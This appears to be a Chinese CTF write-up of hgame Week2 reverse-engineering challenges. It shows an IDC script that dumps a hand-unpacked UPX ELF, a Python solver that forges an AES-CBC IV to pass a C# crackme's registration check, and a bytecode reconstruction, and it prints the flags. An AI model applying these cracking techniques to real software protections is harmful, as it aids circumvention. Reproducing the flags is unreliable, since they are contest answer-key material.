<h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1048649-1-1.html">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PT_LOAD              1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">  <span class="hljs-keyword">auto</span> e_phoff;</span><br><span class="line">  <span class="hljs-keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">  <span class="hljs-keyword">auto</span> i,dumpfile;</span><br><span class="line">  ImageBase=<span class="hljs-number">0x400000</span>;</span><br><span class="line">  StartImg=<span class="hljs-number">0x400000</span>;</span><br><span class="line">  EndImg=<span class="hljs-number">0x0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Dword</span>(ImageBase)==<span class="hljs-number">0x7f454c46</span> || <span class="hljs-built_in">Dword</span>(ImageBase)==<span class="hljs-number">0x464c457f</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span>(dumpfile=<span class="hljs-built_in">fopen</span>(<span class="hljs-string">"D:\\dumpfile"</span>,<span class="hljs-string">"wb"</span>))</span><br><span class="line">    {</span><br><span class="line">      e_phoff=ImageBase+<span class="hljs-built_in">Qword</span>(ImageBase+<span class="hljs-number">0x20</span>);</span><br><span class="line">      <span class="hljs-built_in">Message</span>(<span class="hljs-string">"e_phoff = 0x%x\n"</span>, e_phoff);</span><br><span class="line">      e_phnum=<span class="hljs-built_in">Word</span>(ImageBase+<span class="hljs-number">0x38</span>);</span><br><span class="line">      <span class="hljs-built_in">Message</span>(<span class="hljs-string">"e_phnum = 0x%x\n"</span>, e_phnum);</span><br><span class="line">      <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      {</span><br><span class="line">         <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Dword</span>(e_phoff)==PT_LOAD || <span class="hljs-built_in">Dword</span>(e_phoff)==PT_DYNAMIC)</span><br><span class="line">         { </span><br><span class="line">			p_offset=<span class="hljs-built_in">Qword</span>(e_phoff+<span class="hljs-number">0x8</span>);</span><br><span class="line">            StartImg=<span class="hljs-built_in">Qword</span>(e_phoff+<span class="hljs-number">0x10</span>);</span><br><span class="line">            EndImg=StartImg+<span class="hljs-built_in">Qword</span>(e_phoff+<span class="hljs-number">0x28</span>);</span><br><span class="line">            <span class="hljs-built_in">Message</span>(<span class="hljs-string">"start = 0x%x, end = 0x%x, offset = 0x%x\n"</span>, StartImg, EndImg, p_offset);</span><br><span class="line">            <span class="hljs-built_in">dump</span>(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">            <span class="hljs-built_in">Message</span>(<span class="hljs-string">"dump segment %d ok.\n"</span>,i);</span><br><span class="line">         }    </span><br><span class="line">         e_phoff=e_phoff+<span class="hljs-number">0x38</span>;</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      <span class="hljs-built_in">fseek</span>(dumpfile,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0</span>);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="hljs-built_in">fseek</span>(dumpfile,<span class="hljs-number">0x28</span>,<span class="hljs-number">0</span>);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="hljs-built_in">fputc</span>(<span class="hljs-number">0x00</span>,dumpfile);</span><br><span class="line">	  </span><br><span class="line">      <span class="hljs-built_in">fclose</span>(dumpfile);</span><br><span class="line">    }<span class="hljs-keyword">else</span> <span class="hljs-built_in">Message</span>(<span class="hljs-string">"dump err."</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">dump</span><span class="hljs-params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">auto</span> i;</span><br><span class="line">  <span class="hljs-keyword">auto</span> size;</span><br><span class="line">  size=endimg-startimg;</span><br><span class="line">  <span class="hljs-built_in">fseek</span>(dumpfile,offset,<span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i=<span class="hljs-number">0</span>; i &lt; size; i=i+<span class="hljs-number">1</span> ) </span><br><span class="line">  {</span><br><span class="line">	<span class="hljs-built_in">fputc</span>(<span class="hljs-built_in">Byte</span>(startimg+i),dumpfile);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">scanf</span>((__int64)<span class="hljs-string">"%42s"</span>, v7);</span><br><span class="line">  v5 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">41</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( i + v7[i] != (<span class="hljs-keyword">unsigned</span> __int8)byte_6CA0A0[i] )</span><br><span class="line">      v5 = <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v0 = <span class="hljs-string">"Wrong input"</span>;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Wrong input"</span>, v7);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v0 = <span class="hljs-string">"Congratulations! Flag is your input"</span>;</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congratulations! Flag is your input"</span>, v7);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>

<p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ida_chars[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">0x68</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x49</span>,</span><br><span class="line">                    <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x65</span>,</span><br><span class="line">                    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x4D</span>,</span><br><span class="line">                    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x95</span>,</span><br><span class="line">                    <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xA6</span></span><br><span class="line">            };</span><br><span class="line">    string flag;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">42</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            flag+=ida_chars[i]-i;</span><br><span class="line">        }</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>最后输出flag</p>
<figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">hgame</span>{Unp@cking_<span class="hljs-number">1</span>s_R<span class="hljs-number">0</span>m<span class="hljs-number">4</span>ntic_f<span class="hljs-number">0</span>r_r<span class="hljs-number">3</span>vers<span class="hljs-number">1</span>ng}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p>
<p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">		{</span><br><span class="line">			if (this.status == 1)</span><br><span class="line">			{</span><br><span class="line">				MessageBox.Show("你已经激活成功啦，快去提交flag吧~~~");</span><br><span class="line">				return;</span><br><span class="line">			}</span><br><span class="line">			string text = this.textBox1.Text;</span><br><span class="line">			if (text.Length != 46 || text.IndexOf("hgame{") != 0 || text.IndexOf("}") != 45)</span><br><span class="line">			{</span><br><span class="line">				MessageBox.Show("Illegal format");</span><br><span class="line">				return;</span><br><span class="line">			}</span><br><span class="line">			string base64iv = text.Substring(6, 24);</span><br><span class="line">			string str = text.Substring(30, 15);</span><br><span class="line">			try</span><br><span class="line">			{</span><br><span class="line">				Aes aes = new Aes("SGc0bTNfMm8yMF9XZWVLMg==", base64iv);</span><br><span class="line">				Aes aes2 = new Aes("SGc0bTNfMm8yMF9XZWVLMg==", "MFB1T2g5SWxYMDU0SWN0cw==");</span><br><span class="line">				string text2 = aes.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=");</span><br><span class="line">				if (text2.Equals("Same_ciphertext_"))</span><br><span class="line">				{</span><br><span class="line">					byte[] array = new byte[16];</span><br><span class="line">					Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);</span><br><span class="line">					if (Convert.ToBase64String(array).Equals("dJntSWSPWbWocAq4yjBP5Q=="))</span><br><span class="line">					{</span><br><span class="line">						MessageBox.Show("注册成功！");</span><br><span class="line">						this.Text = "已激活，欢迎使用！";</span><br><span class="line">						this.status = 1;</span><br><span class="line">					}</span><br><span class="line">					else</span><br><span class="line">					{</span><br><span class="line">						MessageBox.Show("注册失败！\nhint: " + aes2.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="));</span><br><span class="line">					}</span><br><span class="line">				}</span><br><span class="line">				else</span><br><span class="line">				{</span><br><span class="line">					MessageBox.Show("注册失败！\nhint: " + aes2.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="));</span><br><span class="line">				}</span><br><span class="line">			}</span><br><span class="line">			catch</span><br><span class="line">			{</span><br><span class="line">				MessageBox.Show("注册失败！");</span><br><span class="line">			}</span><br><span class="line">		}</span><br></pre></td></tr></tbody></table></figure>

<p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p>
<p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p>
<p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p>
<p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p>
<p>直接python解决：</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AesCrypter</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, key, iv</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.iv = iv</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pkcs7padding</span>(<span class="hljs-params">self, text</span>):</span></span><br><span class="line">        bs = AES.block_size  <span class="hljs-comment"># 16</span></span><br><span class="line"></span><br><span class="line">        length = <span class="hljs-built_in">len</span>(text)</span><br><span class="line">        bytes_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(text, encoding=<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        padding_size = length <span class="hljs-keyword">if</span> (bytes_length == length) <span class="hljs-keyword">else</span> bytes_length</span><br><span class="line">        padding = bs - padding_size % bs</span><br><span class="line">        padding_text = <span class="hljs-built_in">chr</span>(padding) * padding</span><br><span class="line">        <span class="hljs-keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pkcs7unpadding</span>(<span class="hljs-params">self, text</span>):</span></span><br><span class="line">        length = <span class="hljs-built_in">len</span>(text)</span><br><span class="line">        unpadding = <span class="hljs-built_in">ord</span>(text[length - <span class="hljs-number">1</span>])</span><br><span class="line">        <span class="hljs-keyword">return</span> text[<span class="hljs-number">0</span>:length - unpadding]</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">self, content</span>):</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        content_padding = self.pkcs7padding(content)</span><br><span class="line">        aes_encode_bytes = cipher.encrypt(<span class="hljs-built_in">bytes</span>(content_padding, encoding=<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        result = base64.b64encode(aes_encode_bytes).decode(encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        <span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params">self, content</span>):</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        <span class="hljs-comment"># base64解码</span></span><br><span class="line">        aes_encode_bytes = base64.b64decode(content)</span><br><span class="line">        <span class="hljs-comment"># 解密</span></span><br><span class="line">        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)</span><br><span class="line">        <span class="hljs-comment"># 重新编码</span></span><br><span class="line">        result = aes_decode_bytes.decode(encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        <span class="hljs-comment"># 去除填充内容</span></span><br><span class="line">        result = self.pkcs7unpadding(result)</span><br><span class="line">        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">None</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">""</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = base64.b64decode(<span class="hljs-string">"SGc0bTNfMm8yMF9XZWVLMg=="</span>)</span><br><span class="line">fakeIV = base64.b64decode(<span class="hljs-string">'MFB1T2g5SWxYMDU0SWN0cw=='</span>)</span><br><span class="line">plainText = <span class="hljs-string">"Same_ciphertext_"</span></span><br><span class="line">ciperText = <span class="hljs-string">"mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="</span></span><br><span class="line"></span><br><span class="line">aesCipher = AesCrypter(key, fakeIV)</span><br><span class="line"></span><br><span class="line">fakePlainText = aesCipher.decrypt(ciperText)</span><br><span class="line"><span class="hljs-comment"># print(fakePlainText)</span></span><br><span class="line">IV = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):</span><br><span class="line">    IV += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(fakePlainText[i]) ^ fakeIV[i] ^ <span class="hljs-built_in">ord</span>(plainText[i]))</span><br><span class="line"><span class="hljs-comment"># print("IV : " + IV)</span></span><br><span class="line"><span class="hljs-comment"># /TyXYzPnY;$)\we_</span></span><br><span class="line">IV = base64.b64encode(IV.encode(<span class="hljs-string">'utf-8'</span>)).decode(<span class="hljs-string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">cipherText2 = aesCipher.encrypt(plainText)</span><br><span class="line">cipherText2 = base64.b64decode(cipherText2).<span class="hljs-built_in">hex</span>()[:<span class="hljs-number">32</span>]</span><br><span class="line">cipherText3 = <span class="hljs-string">'dJntSWSPWbWocAq4yjBP5Q=='</span></span><br><span class="line">cipherText3 = base64.b64decode(cipherText3).<span class="hljs-built_in">hex</span>()[:<span class="hljs-number">32</span>]</span><br><span class="line"><span class="hljs-comment"># print(cipherText2 + cipherText3)</span></span><br><span class="line">cipherText4 = <span class="hljs-built_in">bytes</span>.fromhex(cipherText2 + cipherText3)</span><br><span class="line">cipherText4 = base64.b64encode(cipherText4)</span><br><span class="line"><span class="hljs-comment"># print(cipherText4)</span></span><br><span class="line">plainText3 = aesCipher.decrypt(cipherText4)</span><br><span class="line"><span class="hljs-comment"># print(plainText3)</span></span><br><span class="line"><span class="hljs-comment"># Same_ciphertext_DiFfer3Nt_w0r1d</span></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line">flag += <span class="hljs-string">'hgame{'</span> + IV + plainText3[<span class="hljs-number">16</span>:] + <span class="hljs-string">'}'</span></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br><span class="line"><span class="hljs-comment"># hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</span></span><br></pre></td></tr></tbody></table></figure>

<p>最终的flag</p>
<figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">hgame</span>{L<span class="hljs-number">1</span>R<span class="hljs-number">5</span>WFl<span class="hljs-number">6</span>UG<span class="hljs-number">5</span>ZOyQpXHdlXw==DiFfer<span class="hljs-number">3</span>Nt_w<span class="hljs-number">0</span>r<span class="hljs-number">1</span>d}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p>
<p>dis指令表见<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p>
<p>还原出来的函数原型（想打死命名的人）</p>
<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">OOo</span>):</span></span><br><span class="line"> O0O = OOo[::-<span class="hljs-number">1</span>]</span><br><span class="line"> O0o = <span class="hljs-built_in">list</span>(O0O)</span><br><span class="line"> <span class="hljs-keyword">for</span> O0 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(O0o)):</span><br><span class="line"> 	Oo = O0o[O0-<span class="hljs-number">1</span>] ^ O0o[O0]</span><br><span class="line"> 	O0o[O0] = Oo</span><br><span class="line"> O = <span class="hljs-built_in">bytes</span>(O0o)</span><br><span class="line"> <span class="hljs-keyword">return</span> O.<span class="hljs-built_in">hex</span>()</span><br></pre></td></tr></tbody></table></figure>

<p>所以只需要反过来异或一遍就可以了</p>
